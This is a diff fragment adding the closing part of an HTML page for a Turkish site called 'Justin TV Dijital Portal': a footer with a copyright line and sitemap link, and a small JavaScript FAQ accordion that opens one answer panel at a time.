+        <p>© 2026 Justin TV Dijital Portal. Tüm hakları saklıdır. | <a href="https://justintv-live2.com/sitemap.xml" style="color:var(--kehribarkavsak-text-sub);">Sitemap</a></p>
+    </footer>
+
+    <!-- Akordeon JS -->
+    <script>
+        document.querySelectorAll('.kehribarkavsak-faq-toggle').forEach(kavsakSoruTetikleyicisi => {
+            kavsakSoruTetikleyicisi.addEventListener('click', () => {
+                const kavsakSoruKutusu = kavsakSoruTetikleyicisi.closest('.kehribarkavsak-faq-item');
+                const kavsakCevapBolmesi = kavsakSoruKutusu.querySelector('.kehribarkavsak-faq-drawer');
+                
+                const kavsakAciklikDurumu = kavsakSoruKutusu.classList.contains('kehribarkavsak-open');
+                
+                // Diğer açık akordeonları kapat
+                document.querySelectorAll('.kehribarkavsak-faq-item').forEach(kavsakDigerKutusu => {
+                    kavsakDigerKutusu.classList.remove('kehribarkavsak-open');
+                    kavsakDigerKutusu.querySelector('.kehribarkavsak-faq-drawer').style.maxHeight = null;
+                });
+
+                if (!kavsakAciklikDurumu) {
+                    kavsakSoruKutusu.classList.add('kehribarkavsak-open');
+                    kavsakCevapBolmesi.style.maxHeight = kavsakCevapBolmesi.scrollHeight + "px";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
